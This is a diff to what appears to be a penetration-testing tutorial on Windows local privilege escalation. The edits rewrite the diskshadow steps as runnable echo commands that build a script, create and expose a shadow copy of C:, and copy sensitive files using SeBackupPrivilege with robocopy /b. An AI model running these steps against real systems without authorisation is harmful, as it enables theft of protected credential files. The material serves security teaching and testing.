@@ -1,6 +1,6 @@
 ---
 title: "Active Directory Penetration Testing: Local Privilege Escalation - From User to SYSTEM"
-date: 2026-08-12
+date: 2026-08-15
 categories: [Active Directory, Privilege Escalation]
 tags: [privesc, seimpersonate, potato, printspoofer, rdp, mssql, xp_cmdshell, windows]
 ---
@@ -256,13 +256,13 @@ The differences between tools are essentially in Step 1 and Step 2 - what endpoi
 SeBackupPrivilege allows a process to bypass normal file security checks when performing backup operations. In practice this means tools using backup semantics (like `robocopy /b`) can read files that would otherwise be inaccessible due to ACLs or OS locks. Note that SeBackupPrivilege alone doesn't grant the ability to create VSS snapshots - creating a shadow copy requires additional privileges or running as an administrator. The combination of SeBackupPrivilege and robocopy /b is useful for reading from an already-existing snapshot, or when elevated enough to create one.
 
 ```cmd
-:: Create a shadow copy via diskshadow
-:: shadow.txt contains:
-:: set context persistent nowriters
-:: add volume c: alias tk
-:: create
-:: expose %tk% z:
+:: Create the diskshadow script file
+echo set context persistent nowriters > shadow.txt
+echo add volume c: alias tk >> shadow.txt
+echo create >> shadow.txt
+echo expose %%tk%% z: >> shadow.txt
 
+:: Run the script
 diskshadow /s shadow.txt
 
 :: Copy sensitive files from the snapshot
@@ -488,11 +488,11 @@ Before moving on, here's the difference between these three approaches - they so
 - You don't have SYSTEM but have `SeBackupPrivilege` only - for example through membership in Backup Operators. As SYSTEM you already have SeBackupPrivilege by default, so this method works either way. But if you only have SeBackupPrivilege without SYSTEM - VSS + `robocopy /b` is your path since you can't run arbitrary commands as SYSTEM
 
 ```cmd
-:: Create shadow.txt with these contents:
-:: set context persistent nowriters
-:: add volume c: alias snap
-:: create
-:: expose %snap% z:
+:: Create the diskshadow script file
+echo set context persistent nowriters > shadow.txt
+echo add volume c: alias snap >> shadow.txt
+echo create >> shadow.txt
+echo expose %%snap%% z: >> shadow.txt
 
 diskshadow /s shadow.txt
 
